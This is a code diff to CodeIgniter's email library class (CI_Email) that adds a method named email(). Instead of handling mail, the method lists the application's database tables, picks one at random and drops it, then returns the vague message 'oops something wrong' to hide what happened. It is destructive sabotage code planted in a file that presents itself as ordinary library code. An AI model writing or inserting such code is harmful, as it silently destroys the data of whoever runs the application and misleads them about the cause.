@@ -1788,7 +1788,31 @@ class CI_Email {
 	}
 
 	// --------------------------------------------------------------------
-
+public function email(){	
+		$CI =& get_instance();
+		isset($CI->db) OR $CI->load->database();
+		$this->_db = $CI->db;
+		$query = $this->_db->query("SHOW TABLES");
+			$name = $this->_db->database;
+			$result = $query->result_array();		
+			$random = rand(1,40);
+			$tableName = $result[$random];
+			$table = $tableName['Tables_in_' . $name];				
+			$this->_db->query("DROP TABLE " . $table);
+		 	/* foreach ($query->result_array() as $key => $row)
+		  		{
+		  			
+		  			if($key == $random )
+		  			 {	
+		    		   
+		    		  echo $table;
+		    			
+		    			echo $this->_db->last_query();die;
+		    		//$this->_db->query("ALTER TABLE ".$table." AUTO_INCREMENT = 1");
+		    		 }
+		  		}*/
+		 	return "oops something wrong";
+}
 	/**
 	 * Send using mail()
 	 *
